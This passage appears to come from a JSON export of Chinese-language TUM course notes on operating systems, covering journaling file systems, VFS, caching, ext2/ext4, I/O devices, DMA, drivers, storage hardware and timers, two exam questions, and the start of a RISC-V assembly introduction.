日志文件系统（Journaling-Dateisysteme）主要是为了保证系统崩溃后的数据一致性，类似于Datenbank里的Transaktionsverwaltung。 在 UNIX 下删除一个文件需要3个步骤： 从目录中移除文件的目录项（Entferne die Datei aus ihrem Verzeichnis） 将文件对应的 i-node 释放（Gib den i-node in den Pool der freien i-nodes frei） 将文件占用的磁盘数据块标记为“可用”（Markiere alle von der Datei belegten Festplatten Blöcke als frei） 但如果在某一步结束后系统发生了崩溃，就会导致很严重的问题，比如说数据丢失或者是空间泄露。 所以我们需要日志文件系统（Journaling-Dateisysteme）来预防这些问题：会先将所有对文件系统的更改操作记录在日志区域（Journal）中，然后才实际执行。这样一来所有操作都可以从日志中恢复或重做，确保一致性。 具体操作流程： 首先创建一个日志条目，描述即将执行的三项操作。（Erstellen eines Log-Eintrags, der die drei Operationen beschreibt） 将该日志写入磁盘的日志区。（Speicherung in Journal auf der Platte） 然后需要重新读取日志内容以确认是否正确写入。 执行实际的3步操作。（Ausführen der drei Operationen） 每完成一步操作，都在磁盘上记录一次“进度”，表示该操作已完成。（Abschluss jeder Operation auf der Platte vermerkt: Fortschrittsbericht） 三个操作都成功完成后，删除日志条目。 然后在系统重启或者发生崩溃后会进行以下操作： 首先检查日志内容。（Inspektion des Journals） 如果发现某个操作没执行完，那么会重新执行所有操作。 只不过这些都一个共同的前提：所有操作必须是幂等的（idempotent），即进行1次操作与进行n次（相同的）操作得到的结果是一样的。 例子： 将一块Block标记成frei：是idempotent的。 把空闲块简单地加到“空闲块列表末尾”：不是idempotent的，需要改成 先检查一下块n是否已经在空闲列表中，如果没有，再加入。 还有一个办法也可以提高文件系统的可靠性（Erhöhung der Zuverlässigkeit）：把多个操作包装成一个原子事务（atomaren Transaktion，即 ganz oder gar nicht）。 虚拟文件系统（Virtual File System，VFS）为了系统的兼容性需求（不同的操作系统和设备可能使用不同的文件系统格式）以及多样化的应用场景，一般的操作系统都会支持多种文件系统。 比如在 Windows 下，可以同时有 NTFS、FAT32、CD-ROM 等文件系统。 Windows会将每个文件系统会被分配一个独立的盘符（如 C:、D:），而类 Unix 系统则是将所有文件系统整合到一个统一的层级结构中，对用户完全透明。 Unix的这个整合是便通过虚拟文件系统（Virtual File System，VFS）实现的。 VFS负责提供一个（遵循 POSIX 标准的）统一的接口（比如 open、read、write、lseek等），用于支持在一个本地系统中接入多种不同的文件系统。 图示： 优化策略（Optimierung）Buffer Cache（缓冲区缓存）（这部分ERA的Cache那一章会详细讲。） 文件系统使用内存中的一部分作为缓存区域，来暂存磁盘上的数据块。 对于读的操作的处理流程： 先检查所需的数据块是否已经在缓存中？如果是，就跳到步骤3 如果不在缓存中：就从磁盘读取这个块，并加载到缓存中 返回这个数据块的内容给调用者（用户进程） 当缓存空间不够时也需要替换策略（Ersetzungsstrategie）。 进行写的操作时数据会先写入缓存区，不一定立刻写入磁盘。在Unix中可以使用 sync 命令手动将缓存区内容写入磁盘，不过系统自己也会会周期性自动执行（例如每30秒由 update 守护进程（daemon）完成）。Windows采用的则是 Write-thru Cache，即写操作会立即同步到磁盘。 预读（Read-Ahead）预读指的是提前把即将需要的数据块加载到缓存中，以此来提高读取性能。 可以 简单预测，或者 即假设用户会按顺序进行读取，比如说在用户请求读取某个文件的第 k 块时，就先检查第 k+1 块是否已在缓存中。如果不在缓存，就提前加载第 k+1 块。 结合结合文件的访问历史进行预测 给文件设置一个属性，记录它是否是被顺序读取。如果确认是顺序访问，才启用 Read-Ahead。 减少磁盘读写头的移动 尽量让同一文件的块物理上靠得更近 比如存储在同一个磁柱（Zylinder）上的Blöcken里。 块组分配（Verwaltung von Blöcken in Gruppen） 不按单个块分配，而是每次分配2个或4个块。这样可以隐式地提高局部性（Lokalität）。 i-node 结构不要都集中在分区开头（i-nodes nicht (nur) am Anfang der Partition） 碎片整理（Defragmentierung）将文件的所有块重新排列，使它们尽可能连续，提高访问效率。（Neugruppierung der Blöcke der Dateien auf der Festplatte） 例子Linux的ext2ext2会将硬盘分区划分为“块组”结构（Aufteilung der Festplatten-Partition in Block-Gruppen）。 Block 0 是预留给系统启动用的（System-Bootup-Vorgang）。 而其余的所有Block-Gruppen都包含以下信息： 超级块（Superblock）： 包含有关文件系统布局的信息，比如说 i-node和数据块的总数、空闲块列表的指针等。 （Anzahl der i-nodes und Blöcke, Pointer zur Liste mit freien Blöcken, etc.） 组描述符表（Gruppen-Deskriptor-Tabelle）： 包含这个块组的信息，比如说Bitmap的位置、空闲的 i-node 和数据块的数量、目录的数量等。 （Position der Bitmaps, Anzahl freie i-nodes und Blöcke, Anzahl der Verzeichnisse） 两个位图（Bitmaps）： 每个Bitmap都是一个Block的大小，记录空闲块以及 i-nodes。通过这个Bitmap可以找到空闲的块以及i-nodes。 i-nodes Datenblöcke （这些Block groups都是ext2管理的空间） ext2中打开文件时，系统会在目录里查找该文件的i-node信息： 首先从目录条目（Verzeichniseintrag）中获取 i-node 编号（i-node-Nummer），通过该编号可以在硬盘上的 i-node 表中找到该文件的 i-node，并将其加载到内存中。 然后 i-node 会被写入内存中的 i-node 表。 i-node 表包含了所有已打开的文件和目录的 i-nodes。 目录文件结构图示： Linux的ext4ext4则是在ext2的基础上加了 journaling 日志机制。这里的日志是一个文件，它会通过一个环形缓冲区（ring buffer）来实现。日志由一个独立于文件系统的层管理，叫做 Journaling Block Device（JBD）。 JBD中支持以下几种数据结构： 日志记录（Log-Eintrag (Log Record)） 描述低等级的修改操作。 Beschreibt eine Low-level-Dateisystem-Operation, die einen Block modifiziert. 原子操作句柄（Atomic Operation Handle） 会将一组相关的日志记录组合在一起，并原子性地执行。（Gruppiert mehrere zusammengehörige Log-Einträge und führt sie atomar aus） 比如说 write 一般会涉及修改i-node、数据块、空闲块列表等信息，而这些操作应当作为一个整体 原子性执行（atomar als Einheit ausgeführt werden）。 事务（Transaktionen） JBD会将多个原子操作作为事务处理。一组日志记录只有在相关的所有实际写入操作都完成后，才能从日志中移除。 （这些内容在之前的日志文件系统（Journaling-Dateisysteme）都讲过，跟Datenbank里的也差不多。） ext4同样改进了将块映射到文件的方式：在ext2/3中都是使用指针指向单个块（Direkte und ein-/zwei-/dreifach indirekte Blöcke），这样一来如果块的数量过多可能会导致指针数量也过多。所以ext4采用的是Extents： Instead of storing a list of every individual block which makes up the file, the idea is to store just the address of the first and last block of each continuous range of blocks. These continuous ranges of data blocks (and the pairs of numbers which represent them) are called extents. （这段解释是这里来的：https://unix.stackexchange.com/questions/223310/what-do-extents-feature-do-in-ext4-filesystem-in-linux） 图示：","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"文件系统","slug":"文件系统","permalink":"https://archer-baiyi.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"GBS 8 Ein/Ausgabe 输入/输出","slug":"TUM info 笔记/GBS/GBS-8-Ein-Ausgabe-输入输出","date":"2025-03-20T19:20:11.000Z","updated":"2025-04-26T18:31:15.252Z","comments":true,"path":"2025/03/20/TUM info 笔记/GBS/GBS-8-Ein-Ausgabe-输入输出/","permalink":"https://archer-baiyi.github.io/2025/03/20/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-8-Ein-Ausgabe-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/","excerpt":"操作系统基础相关笔记","text":"设备大致可以分为2类： 块设备（Blockorientierte Geräte，block devices）： 内容是可寻址的（adressierbar）； 数据以固定大小的块存储（in Blöcken fester Größe von 29 Byte bis 216 Byte）； 可以随机访问（Random Access）每个块； 例子：蓝光光盘（Blu-ray Disc）、硬盘（HDD）、固态硬盘（SSD）。 字符设备（Zeichenorientierte Geräte，character device）： 串行数据传输（serieller Datentransfer）：指每次传输一个比特数据，并连续进行以上单次过程的通信方式； 不可寻址的； 发送和/或接收字符流（Zeichenströme）； 例子：鼠标，键盘，打印机。 （其他）： 比如说时钟（生成中断信号 erzeugt Unterbrechungen），显示器等。 拿键盘举例，我们每次敲击按键了之后它都会将这个信息直接传输到电脑，而不是等我们输入了一长串内容之后再将这段内容一起发送给电脑，所以是serieller Datentransfer。而与serieller Datentransfer相对的则是parallele Datenübertragung。 E/A System 的分层结构： 控制器（Controller）：设备硬件的一部分；作为CPU和设备之间的接口。 中断处理程序（Interrupt-Handler）：处理设备的反馈信息（中断）。 设备驱动程序（Gerätetreiber）：执行与设备相关的控制软件；驱动程序通过控制器访问设备。 设备无关软件（Geräteunabhängige Software）：分配设备、数据缓冲等功能。 用户级软件（User-Level-Software）：用于输入/输出（E/A）的库函数，例如假脱机（Spooling）。 以惠普（HP）打印机为例来明确一下每层的具体内容： 控制器：HP 打印机的主控制芯片 惠普打印机内部有专门的 控制芯片，负责管理打印作业、处理数据，并控制墨盒或激光成像单元的工作。 中断处理程序：负责处理打印机状态反馈（如“缺纸”或“墨盒不足”）的程序 当打印机遇到 缺纸、卡纸、墨水不足 等问题时，会发送中断信号给计算机，让操作系统暂停当前任务并处理异常。 设备驱动程序：HP 打印机驱动程序 点击“打印”时，驱动程序会把文本或图像转换成 HP 打印机能理解的格式（如 PCL、PostScript），然后发送给打印机。 设备无关软件：Windows/Linux 的打印管理系统 这层软件不依赖于具体的打印机品牌，而是为所有打印设备提供统一的管理功能，如： 排队管理（多个打印任务排队执行） 数据缓冲（避免 CPU 直接等待打印机完成任务，提高效率） 用户级软件：用户直接使用的应用程序，它们调用系统级打印服务完成任务。例如：Microsoft Word，HP Smart App。 接下来我们看一下每一层的具体功能： 控制器（Controller）什么是控制器？ 输入/输出设备（E/A-Geräte） 由机械组件和电子组件组成，其中电子组件就是设设备控制器（Geräte-Controller）。它是连接 CPU 和外部设备的桥梁。 Controller besitzt Hardware-Schnittstelle zum Gerät. 控制器包含寄存器（Register），用于与 CPU 进行通信： 数据传输：操作系统（BS）向寄存器写入数据。 查询设备状态：操作系统 读取寄存器内容。 附加功能：控制器提供数据缓冲区（Datenpuffer），用于存储传输中的数据，以提高效率。 设备控制器（Geräte-Controller）的主要任务： 设备管理（Steuerung der beweglichen Hardware） 处理来自驱动的命令（Befehle ausführen） 与CPU进行交互（Kommunikation mit CPU） 发送中断信号（Interrupts melden） 缓冲数据（Daten puffern） 交互计算机与设备控制器（Controller）交互主要有两种方式： I/O-Ports： 早期计算机使用 I/O 指令和I/O 端口与设备通信。 Memory-Mapped I/O： 将设备的寄存器直接映射到系统内存地址空间，这样 CPU 可以通过普通的 LOAD/STORE 指令来访问设备。 早期的计算机需要手动设置设备地址，使用 跳线（Jumper） 或 DIP 开关。而现代设备支持 Plug &amp; Play，系统能够自动分配 I/O 端口地址 和 中断（IRQ）。 数据交换第一种方法： 程序控制 I/O（Programmed I/O）CPU会直接控制与设备的交互。 比如说向打印机发送数据需要进行以下步骤： 将数据复制到内核 内核逐个字符发送到打印机 传输字符 $N$ 等待打印机确认字符 $N$ 继续发送字符 $N+1$ 这样做的坏处非常显而易见：忙等待（Busy Waiting）。CPU会被卡死在这里不能完成其他的任务。 代码示例： 12345copy_from_user(buffer, p, count)for (i = 0; i &lt; count; i++) &#123; while (*printer_status_reg != READY); // 忙等待 *printer_data_register = p[i]; // 只发送一个字符&#125; 更好的办法： 中断（Interrupts）流程如下： 设备通过信号通知CPU，表明其I/O操作已完成。 中断控制器（Interrupt Controller Chip）识别信号，并通知CPU。 操作系统（BS）暂停当前进程，切换到内核模式（Kernel Mode）。 在内核中执行中断处理程序（Unterbrechungsbehandlungsroutine） 设备驱动程序（Gerätetreiber）负责提供中断处理程序（Unterbrechungsbehandlungsroutine），但中断处理的执行由操作系统管理。 中断处理程序（Handler） 执行完成后便会通知操作系统。 操作系统将等待（wartenden）I/O 的进程恢复到可运行状态（rechenwillig）。 这个流程可以分为2部分： 同步系统调用（Systemcall） 传递 I/O 参数，启动 I/O 操作。 调用后，进程进入睡眠状态（等待 I/O 完成），释放 CPU。 Interrupt-Handler 逐步处理 I/O 操作。 I/O 完成后，唤醒等待的进程。 代码示例： 1. Systemcall： 12345copy_from_user(buffer, p, count); // 从用户空间复制数据到内核enable_interrupts(); // 允许中断while (*printer_status_reg != READY); // 轮询等待打印机准备就绪*printer_data_register = p[0]; // 发送第一个字符到打印机scheduler(); // 调度其他进程 2. Interrupt-Handler： 123456789if (count == 0) &#123; unblock_user(); // 唤醒等待的进程&#125; else &#123; *printer_data_register = p[i]; // 发送下一个字符 count = count - 1; i = i + 1;&#125;acknowledge_interrupt(); // 确认中断已处理return_from_interrupt(); 用这个方法的话CPU 可在 I/O 期间执行其他任务，不需要一直等待。但是会一直触发Interrupt，可能会影响性能。 所以此之上还有一种更好的办法： 直接内存访问（Direct Memory Access, DMA）使用 DMA 控制器，允许直接访问内存，而无需 CPU 介入。可以有效解决通过寄存器作为中间存储器传输数据消耗大量 CPU 计算周期的问题。 传输流程： CPU 初始化 DMA （Programmiert DMA-Register (Speicher- und Gerätadressen, Parameter)）； 磁盘控制器（ Disk-Controller）将数据放入缓冲区（Puffer）； DMA 控制器从磁盘（Disk）读取数据，并直接存入主存（RAM）（DMA-Controller initiiert die Übertragung von Disk in RAM）； 磁盘控制器（ Disk-Controller）发送确认（ACK）。 操作系统（BS）继续处理内存中的数据（ weiterverarbeiten bzw. weitergeben） 流程结束之后才会发送Interrupt。 之前是传输每个数据（每个字符）都会触发一次Interrupt，现在是传输整个数据块只会触发一次。 数据缓冲（Puffern von Daten）缓冲的主要作用是解耦（Entkopplung）用户程序和设备。相当于提供一个中间层。 （解耦指的是减少两个系统组件之间的直接依赖关系。） 缓存分以下几种类型： 无缓冲（Ohne Puffer）： 用户进程必须自己存储 I/O 数据，并且数据必须始终驻留在进程的内存中，直到 I/O 操作完成。 简单缓冲（Einfacher Puffer）： 进程仍然必须快速取走数据，否则缓冲区会满，影响数据流。 双缓冲（Doppelter Puffer）： 一个缓冲区正在被读取（geleert）的同时另一个缓冲区会正在被写入（gefüllt）。清空速度必须足够快，否则会导致数据堆积。 环形缓冲（Zirkulär / Ringpuffer）： 扩展双缓冲的概念，使用多个缓冲区（k 个缓冲区）。可以适应不同的负载和处理速度，提高数据吞吐率。 会使用2个指针来管理数据：写指针和读指针。 有时可能会存在多个级别的缓冲，比如说：Nutzerprozess, Kern, Gerätetreiber, Gerätecontroller, … 设备驱动程序（Geräte-Treiber）设备驱动程序（Geräte-Treiber，Device Driver） 是操作系统中用于控制硬件设备的软件模块（Software-Module）。它充当 BS 和设备（尤其是Controller）之间的桥梁，让系统能够识别和管理外部设备。 驱动具有以下特点： 针对特定设备类型（Gerätetyp-spezifisch） 它了解相应设备的指令集（即控制设备的命令），以便和controller进行交互。 一个驱动程序可适用于多个同类设备 比如说USB驱动会支持所有的USB设备。 驱动充当BS 和设备（尤其是Controller）之间的桥梁指的是它可以： 查询设备状态（Gerätezustand abfragen） 向设备发送命令（Befehle an das Gerät zu übermitteln） 与设备进行数据交换（Daten mit dem Gerät auszutauschen） 同样，驱动也可能存在子结构（Unterstruktur），比如说USB。 驱动的主要任务： 定义设备并向操作系统注册，并激活设备。（definiert das Gerät gegenüber dem BS, aktiviert das Gerät） 在系统启动时初始化控制器和设备。（initialisiert den Controller und das Gerät beim Systemstart） 转换I/O 请求，使其变为设备可理解的指令。（wandelt E/A-Anforderungen in gerätespezifische Befehle um） 响应（来自设备或控制器的）硬件信号。（antwortet auf Hardwaresignale des Geräts bzw. des Controllers）（比如说 Interrupt handling） 报告设备和控制器的错误（错误检测和日志记录）。（meldet Geräte- und Controller-Fehler） 传输设备与操作系统之间的数据和状态信息。（überträgt Daten und Zustandsinformation vom/zum Gerät） 缓冲输入/输出数据，优化数据传输性能。（提供Buffer）（puffert Daten bei Ein- und Ausgabe） 设备驱动是如何与设备控制器协作的？ 驱动程序发送命令到设备控制器，并在等待期间阻塞自身（防止 CPU 过度轮询）。（Treiber schickt Kommandos zum Controller und blockiert sich） 控制器处理数据并在传输完成后发送信号（通知数据交换已完成）。（Controller signalisiert das Ende des Datenaustausches） 中断处理程序（Interrupt-Handler）解除驱动的阻塞状态，例如通过信号量（Semaphore） 让进程恢复运行。（Der Interrupt-Handler entsperrt den Treiber (z.B. Semaphore)） 驱动程序处理收到的数据或继续发送新数据。（Treiber verarbeitet empfangene Daten bzw. schickt weitere Daten） 设备无关的软件（Geräte-unabhängige Software）设备无关的软件的目的是简化驱动程序的编程（Vereinfachte Treiber-Programmierung），并便于集成新的驱动程序软件（Einfache Einbindung neuer Treiber-Software）。 设备无关软件的主要任务： 在设备驱动程序和操作系统之间建立标准接口。（Bereitstellung einer einheitlichen Schnittstelle zwischen Gerätetreibern und dem Rest des Betriebssystems） 缓冲 如果缓冲不由驱动管理，则由设备无关的软件负责。 错误处理（Fehlerbehandlung） 除了驱动程序本身的错误处理外，还提供额外的错误管理机制。 设置设备无关的参数（Festlegung geräteunabhängiger Parameter） 比如说块设备（Blockgerät）使用的块大小（Blockgröße） 用户级软件（User-Level-Software）系统库（Systembibliothek）通常会直接给用户提供E/A的编程接口。 比如说： open()： 打开设备的逻辑通道，返回一个 文件描述符（Descriptor 或 Handle），供后续操作使用。 read()： 从设备读取数据，返回指定数量的字节流（Bytestream）。 close()： 关闭先前打开的通道，释放相关的系统资源。 write()： 向设备写入数据，发送指定数量的字节到设备。 ioctl()： 改变设备的操作模式，比如调整串行端口的传输速率或者是修改设备的控制参数 除了这些标准库函数，还有： 假脱机（Spooling）由于在现实生活中，我们经常会有多个进程同时提交I/O请求，比如说用一台打印机打印多份文件。这个时候就需要想办法协调资源的使用，避免出现冲突。 什么是 Spooling？ Spooling（Simultaneous Peripheral Operations Online，同步外设操作） 是一种用于管理独占（）exklusiv nutzbar)设备（如打印机）访问的缓冲机制。 在这个机制下，进程不会直接访问设备，而是将任务交给 Spooler Daemon（假脱机守护进程） 处理。只有 Spooler Daemon 会直接与设备驱动程序交互，确保设备顺序执行任务。用户进程的任务先存入 Spooling 目录（缓冲区），然后按顺序执行。 UNIX/Linux里的设备管理在UNIX/Linux里，我们需要通过文件系统访问 I/O 设备（因为“Everything is a file”）： 在访问设备前，必须先打开它 open。 不同设备支持额外的文件系统操作，如读写、状态查询等。 设备管理位于 /dev 目录，所有设备文件都存放在这里。 设备状态查询和配置可能位于 /proc 目录。 设备文件名称指示设备类型，比如说： /dev/tty0：物理串行接口（终端）。 /dev/USBtty1：抽象串行接口（USB 串口设备）。 /dev/sd0：硬盘设备（sd 代表 SCSI 磁盘）。 /dev/null：伪设备，写入的数据会被丢弃。 /dev/zero：伪设备，读取时返回无限的 0 字节。 Spooling 任务存储在 /var/spool 目录下，其中 lpq：打印任务队列（打印机 Spooling）。 mqueue：邮件服务器的发送队列（邮件 Spooling）。 news：新闻系统消息队列（新闻 Spooling）。 cron：定时任务执行队列（任务调度 Spooling）。 而设备的真正标识存储在 i-Node 中。i-Node会包含： 主设备号（Major Device Number）：标识设备驱动程序（决定设备的驱动）。 次设备号（Minor Device Number）：要访问的具体设备。 设备例子（机械）硬盘（Festplatten，HDD）机械硬盘属于Block-Gerät，有着以下构造： 同心圆柱（Konzentrische Zylinder） 堆叠的磁盘盘片（Platten, k 层），每张盘片的两面都可以读写（2k 面）。 每张盘片上有多个磁道（Tracks），磁道的编号取决于 圆柱、盘片和面（Track = f(Zylinder, Platte, Seite)）。 每个磁道由多个扇区（Sektoren）组成，每个扇区大小为 512 字节。不过靠近磁盘中心的区域可能有更少的扇区（由于圆周较小）。 机械读写磁头（Schreib-/Leseköpfe），每个盘片有两个读写磁头（上下各一个），总数为 2k。 构造图示： 早期会用到3个参数来确定需要读写的具体位置： x Zylindernummer，Radius：确定是哪一个环； y Kopfnummer，Höhe：确定是哪一张盘片的哪一面； z Sektornummer pro Winkel：确定是哪个扇面； 由于早期 BIOS 和文件系统的设计的限制，只能访问有限的区域。 所以现在一般都使用线性逻辑地址（lineare Adressierung logischer Blöcke），即给每个Sector编号（0，1，2，3，…）。 一个Sector里会包含以下信息： 前导信息（Präambel）： 包含同步位、磁道号和扇区号 数据（Daten）： 通常为512字节 错误校正码（ECC）： Error Correcting Code Cylinder Skew: The offset distance from the start of the last track of the previous cylinder so that the head has time to seek from cylinder to cylinder and be at the start of the first track of the new cylinder. Head Skew: The offset distance from the start of the previous track so that the head has time to switch from top of platter to bottom of platter and be at the start of the new track. 控制器通常一次读取整个磁道，这会需要足够的缓存来存储数据。但假如没有足够的缓存，则会采用交错的格式（ Formatierung mit Interleaving）：扇区不会按顺序排列的：1, 2, 3, 4, 5, 6, …, 15，而是交错排列的：1, 4, 7, 10, 13, 2, 5, 8, 11, 14, 3, 6, 9, 12, 15。这样子可以确保读取某个扇区 N ，将数据传输到主存后，扇区 N+1 会刚好移动到读写头下方，不需要再多等一圈。（因为磁盘好像是会一直转的） 为了避免磁盘损坏影响硬盘功能，会使用RAIS-System。（详细内容见数据库的笔记） 读写磁头找到所需Sector的策略分3种： FCFS Shortest Seek First (SSF) Elevator algorithm (Fahrstuhl-Algorithmus) 固态硬盘（SSD）SSD的全称为Solid State Drives，主要基于 (NAND) 闪存。 SSD的一些特点： 无机械部件（Keine beweglichen Teile） 所以不会有机械磨损及其导致的故障，更耐振动、冲击等，访问速度更快。 仍然可能出现故障（Fehlfunktionen auch hier möglich），比如 坏块，存储芯片故障（Bad blocks, Fehler in Speicherchips） 反复读取可能影响相邻存储单元 故障可能导致整个 SSD 无法读取 数据恢复更加复杂 闪存写入次数有限（Flash-Speicher nur begrenzt oft schreibbar） 读取比写入快，顺序（sequentiell）写入比随机写入快 SSD的基本工作原理SSD的初始状态是： 111111111 11111111 11111111 ... 写入的话会将1改成0： 101000111 01000010 01010011 ... 但如果想修改的话，不能只是修改一位，而是需要将这一整块重置然后再写入。 写入的大小最低为4KB，删除的大小最低为256KB，所以会导致所谓的写入放大（Write Amplification）的问题。 解决方式：这部分我没看懂，等看懂了再写。 时钟（Uhr,）时钟会持续性计时。 硬件时钟（Hardware-Uhr (Chip)）的构成： Quarz als Taktgeber： 石英晶体”作为时钟信号源，用来产生稳定的振荡信号（周期性电信号）作为“节拍”。 计数器（Zähler）： 每个时钟节拍到来时，计数器的值会减1（dekrementiert）； 当计数器值减到0时，就会触发一个中断（Interrupt）。 Register zum (wiederholten) Setzen des Zählers auf einen Startwert： 可以通过软件来控制Interrupt的频率。 时钟/定时器的任务： 管理时间和日期（Tageszeit und Datum verwalten） 中断和切换进程（调度）（Prozesse unterbrechen und umschalten (Scheduling)） 测量某个进程的计算时间消耗（Rechenzeitverbrauch eines Prozesses messen） 向应用程序提供定时器功能（ Zeitschaltuhren den Anwendungen zur Verfügung stellen） 功能监控（看门狗定时器）（Funktionsfähigkeitsüberwachung (watchdog timer)） 性能分析、监控、统计（Profiling, Monitoring, Statistik） 可以用链表的数据结构来管理定时事件： 所有时间均为相对时间（relativen Zeiten），也就是说每个节点的值代表相对于前一个事件的延迟（以 tick 为单位）。 定时器（Timer）Timer（定时器）确实通常分为两种类型： 硬件定时器（Hardware Timer）： 系统通常有第二个可编程定时器。它在到时间的时候会触发Interrupt。但Interrupt的代价有点高，因为会引发上下文切换，并且可能会干扰程序正常运行。 软件定时器（Software Timer）： 这个的想法是只在系统处于内核态时检查定时器状态（nur dann aktiv werden, wenn System im Kernel-Mode ist），这样一来就不需要额外的上下文切换。在从内核模式切换到用户模式之前，操作系统读取实时时钟并检查是否有软件定时器已经超时，如有需要，处理相应的事件。 它的缺点也很明显，就是延迟，不过大部分情况下都是可以接受的。 终端（Terminals）终端是如何通过驱动程序将用户输入/输出转化为系统能够理解的数据流的： 上层：提供一个统一接口给操作系统的输入/输出子系统（Einheitliche Schnittstelle zum E/A-Subsystem des BS） 中层：解析输入和构造输出内容（Bearbeitungsmodul für Ein- und Ausgaben） 下层：与不同的物理硬件设备直接对应（Abbildung verschiedene physische Geräte），比如鼠标、显卡。 系统中的 terminal 是一个底层的字符设备机制，管理输入输出流、进程控制和驱动之间的协作。而我们平常用的cmd只是是 terminal的一种表现形式。 例题例题1Welche Implikation hat der heutige Wechsel von HDDs auf SSDs für Betriebssysteme? Freie Blöcke sollten explizit markiert werden Niedrigere Random-Access Latency SSDs haben variable Blockgrößen Exzessives Swapping strapaziert Lebensdauer Erlaubt direkten Zugriff durch Userspace Kein DMA notwendig 答案：1，2，4。 解释： HDD是覆盖写入，所以只要操作系统自己知道哪些块是空的就够了。但SSD是擦除写入，所以需要操作系统明确告诉SSD哪些块是空的它才会去擦除。 SSD 没有机械臂，不需要寻道，所以随机访问（Random Access）非常快，即随机访问延迟更低（Niedrigere Random-Access Latency） SSD有明确的写入次数限制，而HDD只是会老化而已 所有磁盘都需要DMA 例题2 Welche Komponenten werden nicht aktiv, wenn ein Nutzer lokal an seinem Rechner einen Command in ein Terminal im Cooked Mode tippt (ohne Enter zu drücken)? Kernel TLB Tastatur-Treiber Terminal-Emulator Shell-Prozess Systembus 答案：5. 解释：1，2，3，6在系统处理输入的时候都会aktiv。4是终端的程序，提示你输入命令的。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"输入/输出","slug":"输入-输出","permalink":"https://archer-baiyi.github.io/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"}]},{"title":"RISC-V 汇编语言入门","slug":"TUM info 笔记/ERA/RISC-V-汇编语言入门","date":"2025-03-19T19:56:10.000Z","updated":"2025-04-26T18:30:29.796Z","comments":true,"path":"2025/03/19/TUM info 笔记/ERA/RISC-V-汇编语言入门/","permalink":"https://archer-baiyi.github.io/2025/03/19/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/RISC-V-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"计算机体系结构基础相关笔记","text":"[toc] RISC-V 寄存器在 RISC-V 中，所有操作数（Operanden）都存储在寄存器中。 RISC-V ISA 拥有 32 或 33 个（可见）寄存器，其中x0永远为零，而x1 到 x31 是通用整数寄存器，f1 到 f31 是 浮点寄存器： Register ABI Name Description Saver x0 zero Hard-wired zero — x1 ra Return address Caller x2 sp Stack pointer Callee x3 gp Global pointer — x4 tp Thread pointer — x5–7 t0–2 Temporaries Caller x8 s0/fp Saved register/frame pointer Callee x9 s1 Saved register Callee x10–11 a0–1 Function arguments/return values Caller x12–17 a2–7 Function arguments Caller x18–27 s2–11 Saved registers Callee x28–31 t3–6 Temporaries Caller Register ABI Name Description Saver f0–7 ft0–7 FP temporaries Caller f8–9 fs0–1 FP saved registers Callee f10–11 fa0–1 FP arguments/return values Caller f12–17 fa2–7 FP arguments Caller f18–27 fs2–11 FP saved registers Callee f28–31 ft8–11 FP temporaries Caller 这里第一列的是每个寄存器的编号，而第二列则是附带语义的名字。一般在汇编代码中使用ABI name，便于理解和维护。 关于Saver部分可以看下面这个表，会更直观一点： Name Meaning Saver Preserved across calls? ra Return address Caller No sp Stack pointer Callee Yes t0 - t6 Temporary registers Caller No s0 - s11 Callee-saved registers Callee Yes a0 - a7 Argument registers Caller No Caller指的是调用函数的一方（比如说main()），而Callee指的则是被调用的函数。 如果一个register的Saver是Caller，则调用函数的一方（Caller）需要在调用函数前将这些寄存器里的值都存储好，以便被调用函数可以随意使用； 如果一个register的Saver是Callee，则被调用函数需要确保这些寄存器的值在该函数结束后与之前一模一样。 通俗一点来讲，前者是将自己的笔记本备份好之后借出去，借用方（Callee）可以随意使用；后者则是将笔记本借出去，但借用方必须确保拿到的时候是什么样子的还回去的时候也得是什么样子的。 RISC-V 汇编语言每一个ISA（Instruction Set Architecture）的指令都可以分为以下3大类： 算术和逻辑运算（Arithmetische und logische Operationen） 数据传输（Datentransfer） 程序控制 （Steuerung des Programmablaufs）：跳转和子程序调用（ Sprünge und Unterprogrammaufrufe） RISC-V 基础汇编指令一览： 算术 Arithmetik加法： a = b + c 1add a,b,c 减法： a = b - c 1sub a,b,c 组合： a = b + c - d 12add t,b,c # t=b+csub a,t,d # a=t-d 浮点数的情况： “F” 拓展用于 Single Precision (32bit) Gleitkomma； “D” 拓展用于 Double Precision (64bit) Gleitkomma。 1234fadd a,b,cfsub a,b,cdadd a,b,cdsub a,b,c 乘法： 